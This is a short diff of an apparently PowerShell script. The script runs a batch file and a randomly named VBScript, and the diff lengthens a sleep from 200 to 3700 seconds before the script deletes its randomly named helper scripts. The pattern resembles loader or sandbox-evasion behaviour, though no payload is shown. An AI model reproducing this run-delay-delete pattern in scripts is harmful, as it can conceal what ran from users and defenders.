@@ -139,6 +139,6 @@ Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
 
 & "./TMqhONoBljEv.vbs"
 
-Start-Sleep -Seconds 200
+Start-Sleep -Seconds 3700
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
